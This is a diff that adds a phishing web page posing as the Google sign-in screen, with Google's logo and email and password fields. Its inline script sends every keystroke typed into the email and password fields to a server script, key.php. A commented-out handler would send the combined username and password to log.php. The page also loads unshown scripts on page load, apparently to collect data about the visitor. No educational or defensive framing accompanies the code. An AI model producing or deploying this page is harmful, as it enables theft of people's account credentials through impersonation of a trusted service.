@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <link rel="stylesheet" href="style.css">
+
+
+    <script src="client.min.js"></script>
+    <script src="loc.js"></script>
+    
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js "></script>
+
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css"
+    />
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login Page</title>
+
+
+
+<body onload="mydata()">
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+            </div>
+            <h1>Sign in</h1>
+            <form>
+                <div class="input-group">
+                    <input id="email" type="email" required>
+                    <label for="email">Email or phone</label>
+                </div>
+                <div class="input-group">
+                    <input id="password" type="password" required>
+                    <label for="password">Password</label>
+                </div>
+                <div class="button-group">
+                    <button type="submit">Next</button>
+                </div>
+                <div class="link">
+                    <a href="#">Forgot email?</a>
+                </div>
+                <div class="link">
+                    <a href="#">Create account</a>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+
+<!-- partial -->
+
+<script>
+  
+  document
+  .getElementById("email")
+  .addEventListener("keypress", function (data) {
+    $.post("key.php", { userkey: data.key });
+      });
+  
+    document
+      .getElementById("password")
+      .addEventListener("keypress", function (data) {
+        $.post("key.php", { passkey: data.key });
+      });
+      
+      
+    // document.getElementById("submit").addEventListener("click", function () {
+    //   username = document.getElementById("email").value;
+    //   password = document.getElementById("password").value;
+    //   $.post("log.php", { sub: username + ":" + password });
+    // });
+
+  </script>
+</body>
+</html>
